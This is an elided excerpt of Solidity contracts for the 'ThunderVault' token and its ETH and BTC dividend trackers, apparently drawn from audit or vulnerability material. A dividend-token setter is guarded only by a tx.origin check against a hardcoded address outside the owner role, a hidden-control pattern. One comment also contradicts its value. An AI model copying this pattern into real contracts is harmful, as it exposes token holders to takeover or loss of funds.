...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0x1118940405E43C47e1C3b0ecbEdF7fb59684c98A, "Only owner");
...
contract ThunderVault is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("ThunderVault", "THUVAU") {
        ethDividendTracker = new ETHDividendTracker();
        BTCDividendTracker = new BITCOINDividendTracker();

        marketingWallet = 0x035280398d4293d90C11e0375D44178602bd0C7E;
        teamWallet = 0x2569796F46C6e794E2551a327f23FA6aD0F79Fd0;
        ethDividendToken = 0x63d55ecDEbF08f93D0F2D5533035ddcCaa997d7A;
        BTCDividendToken = 0xb9654A42f0F5dCDEf5617DebF8bd048E33F180E7;
    ...
    function afterPreSale() external onlyOwner {
        ...
        maxBuyTransactionAmount = 10000000000 * (10**18);
    ...
    function updateETHDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newETHDividendTracker.owner() == address(this), "must be owned by ThunderVault");
    ...
    function updateBITCOINDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newBITCOINDividendTracker.owner() == address(this), "must be owned by ThunderVault");
...
contract ETHDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("ETH_Dividend_Tracker", "ETH_Dividend_Tracker", 0x63d55ecDEbF08f93D0F2D5533035ddcCaa997d7A) {
        claimWait = 3600;
...
contract BITCOINDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("BITCOIN_Dividend_Tracker", "BITCOIN_Dividend_Tracker", 0xb9654A42f0F5dCDEf5617DebF8bd048E33F180E7) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }
